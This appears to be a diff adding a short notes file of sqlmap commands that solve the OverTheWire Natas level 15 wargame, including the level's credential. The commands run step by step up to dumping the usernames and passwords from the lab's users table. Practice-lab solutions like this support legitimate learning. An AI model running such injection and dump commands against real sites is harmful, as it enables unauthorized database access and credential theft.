@@ -1,0 +1,7 @@
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data "username=natas16"
+
+
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data "username=natas16" --level=5 --risk=3
+
+
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php?debug" --string="This user exists" --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data "username=natas16" --level=5 --risk=3 -D natas15 -T users -C username,password --dump
